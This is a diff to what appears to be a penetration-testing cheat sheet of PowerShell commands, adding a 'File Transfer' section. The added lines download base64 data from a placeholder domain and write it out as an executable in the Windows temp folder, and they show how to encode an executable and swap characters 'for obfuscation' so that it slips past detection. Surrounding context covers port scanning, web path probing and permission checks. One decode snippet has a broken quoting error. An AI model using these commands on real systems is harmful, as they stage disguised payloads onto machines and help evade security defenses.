@@ -46,6 +46,22 @@
   `foreach($target in (gc .\targets_http_ip.txt)){ Get-HttpStatus -Target $target -Path .\www_wordlist.txt }`   
 
 ## Helpful PowerShell commands and scripts  
+### File Transfer
+- Download base64 encoded files:   
+  `[System.IO.File]::WriteAllBytes("c:\windows\temp\telem.exe",[System.Convert]::FromBase64String((New-Object Net.Webclient).downloadstring("https://XOURDOMAIN.COM")))`   
+
+- convert to base64 and replace A with @ for obfuscation:   
+  ```
+  $base64string = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\temp\test.exe"))
+  $newstring = $base64string -creplace ('A','@') # NOTE: creplace is important because it must be case sensitive!
+  $newstring | Out-File C:\Users\vkoch\Desktop\newfile.b64
+  ```
+- Convert back after download:   
+  ```  
+  $ByteArray = [System.Convert]::FromBase64String("(Get-Content "C:\Users\username\Downloads\FFPortable.b64") -creplace ('@','A')")
+  [System.IO.File]::WriteAllBytes("C:\temp\newfile.exe", $ByteArray)
+  ```
+  
 ### Recon
 - Portscanning on single port without ping test:   
   `New-Object System.Net.Sockets.TCPClient -ArgumentList "hostname.domain.local",3389`   
@@ -62,7 +78,7 @@
 - Check current users file permissions:   
   ```
   $files = get-childitem -path c:\some\path\with\lotsoffiles;
-foreach($file in $files){
+  foreach($file in $files){
     $filefullname = $file.FullName;
     $acl = get-acl $filefullname;
     foreach($item in $acl.access){
